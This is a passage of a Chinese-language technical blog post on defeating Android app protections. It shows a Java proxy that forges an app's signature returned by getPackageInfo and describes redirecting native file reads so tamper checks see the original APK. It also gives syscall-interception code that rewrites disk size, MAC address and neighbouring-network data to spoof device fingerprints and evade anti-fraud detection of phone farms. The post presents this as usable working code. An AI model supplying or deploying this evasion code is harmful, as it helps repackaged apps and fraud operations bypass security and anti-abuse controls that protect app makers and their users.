appPkgName, int hashCode) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            this.base = base;</span><br><span class="line">            this.SIGN = sign;</span><br><span class="line">            this.appPkgName = appPkgName;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.d(SHARK, &quot;error:&quot;+Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        Log.i(SHARK, method.getName());</span><br><span class="line">        //查看是否是getPackageInfo方法</span><br><span class="line">        if(&quot;getPackageInfo&quot;.equals(method.getName()))&#123;</span><br><span class="line">            String pkgName = (String)args[0];</span><br><span class="line">            Integer flag = (Integer)args[1];</span><br><span class="line">            //是否是获取我们需要hook apk的签名</span><br><span class="line">            if(flag == PackageManager.GET_SIGNATURES &amp;&amp; appPkgName.equals(pkgName))&#123;</span><br><span class="line">                //将构造方法中传进来的新的签名覆盖掉原来的签名</span><br><span class="line">                Signature sign = new Signature(SIGN);</span><br><span class="line">                PackageInfo info = (PackageInfo) method.invoke(base, args);</span><br><span class="line">                info.signatures[0] = sign;</span><br><span class="line">                return info;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return method.invoke(base, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>来自于<a href="https://blog.csdn.net/cshao888/article/details/72859470%EF%BC%9A">https://blog.csdn.net/cshao888/article/details/72859470：</a></p><p>Android应用ui是绘制在主线程中的，这个线程就是<code>ActivityThread</code>。</p><p>但实际上看源码发现<code>ActivityThread</code>并没有继承自Thread,<strong>而是一个独立的类</strong>，只是在其main方法中开了一个<strong>Looper</strong>循环消息，<strong>不断接收处理发到主线程里面的消息</strong>，比如performLaunchActivity</p><p>而<code>ApplicationThread</code>也不是一个Thread,<strong>是一个<code>Binder</code></strong>,主要<strong>用于应用进程和ActivityManagerService进程间通信</strong>的。</p><p>整个ActivityThread框架是<strong>基于Binder通信的C&#x2F;S结构</strong>，从图可知<code>Server</code>端是<code>ActivityThread、ApplicationThread</code></p><p><code>Client</code>是<code>AMS</code>（ActivityManagerService），而<code>ApplicationThreadProxy</code>可以看作AMS中Server代表。</p></blockquote><h3 id="Native层-svc读取-data-app-包名-base-apk-解析zip-解析里面的签名文件信息。"><a href="#Native层-svc读取-data-app-包名-base-apk-解析zip-解析里面的签名文件信息。" class="headerlink" title="Native层 svc读取&#x2F;data&#x2F;app&#x2F;包名&#x2F;base.apk 解析zip 解析里面的签名文件信息。"></a>Native层 svc读取&#x2F;data&#x2F;app&#x2F;包名&#x2F;base.apk 解析zip 解析里面的签名文件信息。</h3><p>Java层是通过AMS通讯获取签名信息，我们直接用svc openat读取apk文件 ， 进行手动解析apk 的签名 。不信任系统Api的解析结果。这个也是常用的检测签名办法。这样拿到的结果就是可信的结果。</p><h4 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a>绕过原理：</h4><p>svc openat的<code>IO重定向</code>，当他读取原始&#x2F;data&#x2F;app&#x2F;包名&#x2F;base.apk 的时候我们将它修改成原始apk的路径。</p><p>这么一来他读取到的是原始apk路径，而不是被修改的路径，得到的签名也就是原始的签名。底层在处理一下svc  readlink readlintat 防止检测路径被替换。</p><p><strong>用这两种方案可以目前干掉市面上99%签名检测 。</strong></p><h2 id="设备指纹2"><a href="#设备指纹2" class="headerlink" title="设备指纹2"></a>设备指纹2</h2><h3 id="Android-Id"><a href="#Android-Id" class="headerlink" title="Android Id"></a>Android Id</h3><p>获取方式</p><h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//原始获取android id</span><br><span class="line">String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);</span><br><span class="line">CLog.i(String.format(&quot;android_id -&gt; 2222 %s&quot;, androidId));</span><br></pre></td></tr></table></figure><h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><p>第一种获取以后，系统会把<code>Android id</code> 保存起来，保存到一个<code>HashMap</code>里面，防止多次<code>IPC</code>初始化 ，所以为了验证第一种方法的准确性，可以二次获取<code>cache</code></p><p>9.0以上需要绕过<code>Android id</code> 的反射限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过反射查询android id cache</span></span><br><span class="line"><span class="type">ArrayMap</span> <span class="variable">mValues</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">sNameValueCache</span> <span class="operator">=</span> Settings.Secure.class.getDeclaredField(<span class="string">&quot;sNameValueCache&quot;</span>);</span><br><span class="line">    sNameValueCache.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">sLockSettings</span> <span class="operator">=</span> sNameValueCache.get(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">fieldmValues</span> <span class="operator">=</span> sLockSettings.getClass().getDeclaredField(<span class="string">&quot;mValues&quot;</span>);</span><br><span class="line">      <span class="comment">//sLockSettings不仅是静态字段，还是一个静态对象字段</span></span><br><span class="line">    fieldmValues.setAccessible(<span class="literal">true</span>); <span class="comment">//private</span></span><br><span class="line">    mValues = (ArrayMap&lt;String,String&gt;) fieldmValues.get(sLockSettings); </span><br><span class="line">      <span class="comment">//调用的是 java.lang.reflect.Field 类 的 get() 方法</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">android_id</span> <span class="operator">=</span> (String)mValues.get(<span class="string">&quot;android_id&quot;</span>);</span><br><span class="line">                                      <span class="comment">//调用的是 ArrayMap 的get方法</span></span><br><span class="line">    CLog.i(String.format(<span class="string">&quot;android_id -&gt; 3333 %s&quot;</span>, android_id));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>调用 <code>get(null)</code> 的原因是 <code>sNameValueCache</code> 这个字段 (field) 是一个 <strong>静态字段 (static field)</strong></p></blockquote><blockquote><ol><li><p><strong><code>fieldmValues</code> 是什么？</strong></p><ul><li><p>它的类型是 <code>java.lang.reflect.Field</code>。</p></li><li><p>你是通过 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">fieldmValues</span> <span class="operator">=</span> sLockSettings.getClass().getDeclaredField(<span class="string">&quot;mValues&quot;</span>);</span><br></pre></td></tr></table></figure><p> 得到的。</p></li><li><p>它本身<strong>不是字段的值</strong>，而是字段的一个<strong>描述或者说“句柄”</strong>。它代表了 <code>sLockSettings</code> 这个对象所属的类里面的那个叫做 <code>mValues</code> 的字段。</p></li></ul></li><li><p><strong><code>.get(sLockSettings)</code> 是在做什么？</strong></p><ul><li>这是在调用 <code>Field</code> 对象的 <code>get()</code> 方法。</li><li>这个方法的含义是：“<strong>请通过我（<code>fieldmValues</code> 这个字段描述）去把 <code>sLockSettings</code> 这个具体对象实例里面的字段值给取出来。</strong>”</li></ul></li></ol></blockquote><h4 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h4><p>方法3也是很基础的Api ，主要通过<code>ContentResolver</code> 进行间接获取 。很多大厂也都在使用 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Bundle</span> <span class="variable">callResult</span> <span class="operator">=</span> context.getContentResolver().call(</span><br><span class="line">            Uri.parse(<span class="string">&quot;content://settings/secure&quot;</span>), <span class="string">&quot;GET_secure&quot;</span>, <span class="string">&quot;android_id&quot;</span>, <span class="keyword">new</span> <span class="title class_">Bundle</span>()</span><br><span class="line">    );</span><br><span class="line">    <span class="type">String</span> <span class="variable">androidIdValue</span> <span class="operator">=</span> callResult.getString(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    CLog.i(String.format(<span class="string">&quot;android_id -&gt; 1111 %s&quot;</span>, androidIdValue));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CLog.e(e.toString(), e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>Bundle</code> 是什么？</strong></p><p> <code>Bundle</code> 是 Android 中用于在不同组件（如 <code>Activities, Services, Content Providers</code>）之间传递数据的关键类。你可以把它想象成一个 <code>Map&lt;String, Object&gt;</code>，它通过键值对（<code>Key-Value</code>）的形式存储数据。它可以存储各种基本数据类型（<code>String</code>, <code>int</code>, <code>boolean</code>等）以及可序列化的对象。</p><p><code>Bundle</code> 之所以能被<strong>跨进程传递</strong>，是因为它实现了 <code>Parcelable</code> 接口。这个接口定义了如何将一个对象“拍扁”（<strong>序列化</strong>&#x2F;编组）成一串可被传输的数据，以及如何从这串数据中恢复（<strong>反序列化</strong>&#x2F;解组）成原始对象。</p><p><strong><code>Bundle</code> 是数据的容器</strong></p><p><strong><code>Binder</code> 是通信的通道</strong></p></blockquote><h4 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h4><p>通过query命令去查询，获取Android id ，这种方式底层走的也是<code>ContentResolver</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//通过content命令查询android id</span><br><span class="line">String android_id = NativeEngine.popen(</span><br><span class="line">        &quot;content query --uri content://settings/secure --where \&quot;name=\\&#x27;android_id\\&#x27;\&quot;&quot;,</span><br><span class="line">        &quot;&quot;);</span><br><span class="line">CLog.i(String.format(&quot;android_id -&gt; 4444 %s&quot;, android_id));</span><br></pre></td></tr></table></figure><h3 id="硬盘字节总大小"><a href="#硬盘字节总大小" class="headerlink" title="硬盘字节总大小"></a>硬盘字节总大小</h3><p>在设备指纹里面，如果想恢复出厂设置也能保证原有的设备信息 ，这个字段可以在服务端的相似度算法里面占比很重 ，可以以型号进行分类。我之前测试过，回复出厂设置指纹也不发生变化的设备指纹核心的设备指纹就几个</p><p>比如<code>硬盘大小</code>，<code>ipv6</code> ，还有一个就是<code>MAC地址</code>，这几个设备指纹也是很核心的设备指纹</p><p>先介绍硬盘字节大小。 也是三种获取方法，但是<strong>方法底层都是一条系统调用</strong>。所以如果要进行对抗的话，只需要在<strong>SVC层</strong>进行处理即可 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">jclass pJclass = env-&gt;FindClass(&quot;android/os/StatFs&quot;);</span><br><span class="line">jmethodID id = env-&gt;GetMethodID(pJclass, &quot;&lt;init&gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);</span><br><span class="line">jobject pJobject =</span><br><span class="line">        env-&gt;NewObject(pJclass, id, env-&gt;NewStringUTF(&quot;/storage/emulated/0&quot;));</span><br><span class="line"> </span><br><span class="line">jlong i = env-&gt;CallLongMethod(pJobject, env-&gt;GetMethodID(pJclass, &quot;getTotalBytes&quot;, &quot;()J&quot;));</span><br><span class="line">LOG(ERROR) &lt;&lt; &quot;Java获取getTotalBytes &quot;&lt;&lt;i;</span><br><span class="line"></span><br><span class="line">char buffer[1024];</span><br><span class="line">FILE *fp = popen(&quot;stat -f /storage/emulated/0&quot;, &quot;r&quot;);</span><br><span class="line">if (fp != nullptr) &#123;</span><br><span class="line">    while (fgets(buffer, sizeof(buffer), fp) != nullptr) &#123;</span><br><span class="line">        //LOGI(&quot;ps -ef %s&quot;,buffer)</span><br><span class="line">        LOG(INFO) &lt;&lt; &quot;stat -f /storage/emulated/0&quot; &lt;&lt; buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct statfs64 buf=&#123;&#125;;</span><br><span class="line">if (statfs64(&quot;/storage/emulated/0&quot;, &amp;buf) == -1) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;statfs64系统信息失败&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_type (文件系统类型): &quot; &lt;&lt; buf.f_type;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_bsize (块大小): &quot; &lt;&lt; buf.f_bsize;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_blocks (总数据块): &quot; &lt;&lt; buf.f_blocks;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_bfree (空闲块): &quot; &lt;&lt; buf.f_bfree;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_bavail (非特权用户可用的空闲块): &quot; &lt;&lt; buf.f_bavail;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_files (总文件节点数): &quot; &lt;&lt; buf.f_files;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_ffree (空闲文件节点数): &quot; &lt;&lt; buf.f_ffree;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_fsid (文件系统 ID): &quot; &lt;&lt; buf.f_fsid.__val[0] &lt;&lt; &quot;, &quot; &lt;&lt; buf.f_fsid.__val[1];</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_namelen (最大文件名长度): &quot; &lt;&lt; buf.f_namelen;</span><br></pre></td></tr></table></figure><p>这三种方法底层走的都是<code>statfs64</code>（<code>arm</code>） 或者<code>statfs</code>（<code>arm64</code>）函数，对抗的话也很简单，直接在<code>statfs64</code> 或者<code>statfs</code> 的<code>after</code>里面对<strong>参数2</strong>进行替换和复写即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">//int statfs(const char *path, struct statfs *buf);</span></span><br><span class="line">        <span class="comment">//int statfs64(const char *path, struct statfs64 *buf);</span></span><br><span class="line">        <span class="keyword">case</span> SC_statfs:</span><br><span class="line">        <span class="keyword">case</span> SC_statfs64: &#123;</span><br><span class="line">            <span class="keyword">if</span> (isMockFingerptint()) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">int</span>) syscall_result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//              f_type：文件系统类型。</span></span><br><span class="line"><span class="comment">//              f_bsize：文件系统块的大小。</span></span><br><span class="line"><span class="comment">//              f_blocks：文件系统中的总块数。</span></span><br><span class="line"><span class="comment">//              f_bfree：文件系统中的可用块数。</span></span><br><span class="line"><span class="comment">//              f_bavail：非超级用户可获取的块数。</span></span><br><span class="line"><span class="comment">//              f_files：文件系统中的总文件节点数。</span></span><br><span class="line"><span class="comment">//              f_ffree：文件系统中的可用文件节点数。</span></span><br><span class="line"><span class="comment">//              f_fsid：文件系统标识。</span></span><br><span class="line"><span class="comment">//              f_namelen：文件名的最大长度。</span></span><br><span class="line">                <span class="type">char</span> pathBuff[PATH_MAX];</span><br><span class="line">                <span class="type">word_t</span> pPath = peek_reg(tracee, ORIGINAL, SYSARG_1);</span><br><span class="line">                <span class="type">int</span> ret = read_string(tracee, pathBuff, pPath, PATH_MAX);</span><br><span class="line">                <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(get_sysnum(tracee, ORIGINAL) == SC_statfs64)&#123;</span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">statfs64</span> <span class="title">fs</span> =</span> &#123;&#125;;</span><br><span class="line">                    <span class="type">word_t</span> arg2 = peek_reg(tracee, ORIGINAL, SYSARG_2);</span><br><span class="line">                    read_data(tracee,&amp;fs,arg2,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs64));</span><br><span class="line">                    NativeFingerHandler::StatfsHandler64(pathBuff,&amp;fs);</span><br><span class="line">                    write_data(tracee,arg2,&amp;fs,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs64));</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">struct</span> statfs fs = &#123;&#125;;</span><br><span class="line">                    <span class="type">word_t</span> arg2 = peek_reg(tracee, ORIGINAL, SYSARG_2);</span><br><span class="line">                    read_data(tracee,&amp;fs,arg2,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs));</span><br><span class="line">                    NativeFingerHandler::StatfsHandler32(pathBuff,&amp;fs);</span><br><span class="line">                    write_data(tracee,arg2,&amp;fs,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="Mac地址"><a href="#Mac地址" class="headerlink" title="Mac地址"></a>Mac地址</h3><p>基础字段，<strong>Java层获取，netlink获取，命令行获取 ，读文件获取</strong>，四种获取方法</p><p>直接在svc的 <code>recvmsg ，recv，recvfrom</code>的after进行数据包替换即可</p><p>如果判断是<code>netlink</code>的消息，并且是获取网卡类型直接对里面的数据包解析和替换即可 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">case SC_recvmsg: &#123;</span><br><span class="line">    //LOGI(&quot;start handle SC_recvmsg systexit after&quot;)</span><br><span class="line">    if (isMockFingerptint()) &#123;</span><br><span class="line">        NetlinkMacHandler::netlinkHandler_recmsg(tracee);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">case SC_recv:</span><br><span class="line">case SC_recvfrom: &#123;</span><br><span class="line">    //LOGE(&quot;start handle SC_recvfrom systexit after&quot;)</span><br><span class="line">    //recv底层走的recvfrom,所以不需要处理recvfrom</span><br><span class="line">    if (isMockFingerptint()) &#123;</span><br><span class="line">        NetlinkMacHandler::netlinkHandler_recv(tracee);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在读文件获取这块因为网卡信息已经在内存里面 ，所以直接<strong>IO重定向</strong>过去即可 。</p><p>常用的获取网卡信息的文件 ，以<code>wlan0</code>为例子 ,场景的获取目录如下：可以cat获取，也可以直接读文件 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/wlan0/address</span><br><span class="line">/sys/devices/virtual/net/wlan0/address</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="附近网卡信息"><a href="#附近网卡信息" class="headerlink" title="附近网卡信息"></a>附近网卡信息</h3><p>这个字段主要是<strong>监控群控的一些信息</strong>的，主要作用是获取当前<code>wifi</code> 附近的人<code>MAC</code>信息的 。</p><p>比如大厂一般检测群控的手段就是获取附近的网卡，<strong>如果有聚集性就可以认为是群控</strong></p><p>获取的方式也也跟上面一样，五种获取方法 。</p><p>获取方法底层也是和<code>MAC</code>获取方法一样 ，底层都是<code>netlink</code>，比如可以直接执行 <code>popen</code>获取 ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(<span class="string">&quot;ip neigh show&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><p>也可以直接直接读文件 ，路径如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br></pre></td></tr></table></figure><p>还可以直接<code>netlink</code>获取 ，在收到消息以后判断消息类型是 <code>hdr-&gt;nlmsg_type == RTM_NEWNEIGH</code> 直接进行替换即可 </p><p>直接在<code>recv</code>收到消息以后对数据里面的<code>buff</code>进行替换即可。主要核心代码如下，包括上面的mac地址替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">static void _getifaddrs_callback(void *context, nlmsghdr *hdr) &#123;</span><br><span class="line">    auto **out = reinterpret_cast&lt;ifaddrs **&gt;(context);</span><br><span class="line"> </span><br><span class="line">    //首先先判断消息类型是不是RTM_NEWLINK类型</span><br><span class="line">    if (hdr-&gt;nlmsg_type == RTM_NEWLINK) &#123;</span><br><span class="line">        auto *ifi = reinterpret_cast&lt;ifinfomsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line"> </span><br><span class="line">        ifaddrs_storage new_addr(out);</span><br><span class="line">        new_addr.interface_index = ifi-&gt;ifi_index;</span><br><span class="line">        new_addr.ifa.ifa_flags = ifi-&gt;ifi_flags;</span><br><span class="line"> </span><br><span class="line">        // Get the interface name</span><br><span class="line">        char ifname[IFNAMSIZ];</span><br><span class="line">        if_indextoname(ifi-&gt;ifi_index, ifname);</span><br><span class="line"> </span><br><span class="line">        // Go through the various bits of information and find the name.</span><br><span class="line">        rtattr *rta = IFLA_RTA(ifi);</span><br><span class="line">        //获取这个消息的长度</span><br><span class="line">        size_t rta_len = IFLA_PAYLOAD(hdr);</span><br><span class="line">        //这块是判断这个消息是否是合格的消息</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            if (rta-&gt;rta_type == IFLA_ADDRESS)&#123; // MAC地址</span><br><span class="line">                if (RTA_PAYLOAD(rta) &lt; sizeof(new_addr.addr)) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    //修改mac地址</span><br><span class="line">                    setMacInData(data, ifname, ZHENXI_RUNTIME_NETLINK_MAC, false);</span><br><span class="line">                    new_addr.SetAddress(AF_PACKET, data, RTA_PAYLOAD(rta));</span><br><span class="line">                    new_addr.SetPacketAttributes(ifi-&gt;ifi_index, ifi-&gt;ifi_type,</span><br><span class="line">                                                 RTA_PAYLOAD(rta));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFLA_BROADCAST) &#123;</span><br><span class="line">                if (RTA_PAYLOAD(rta) &lt; sizeof(new_addr.ifa_ifu)) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    new_addr.SetBroadcastAddress(AF_PACKET, data, byteCount);</span><br><span class="line">                    new_addr.SetPacketAttributes(ifi-&gt;ifi_index, ifi-&gt;ifi_type,</span><br><span class="line">                                                 RTA_PAYLOAD(rta));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if 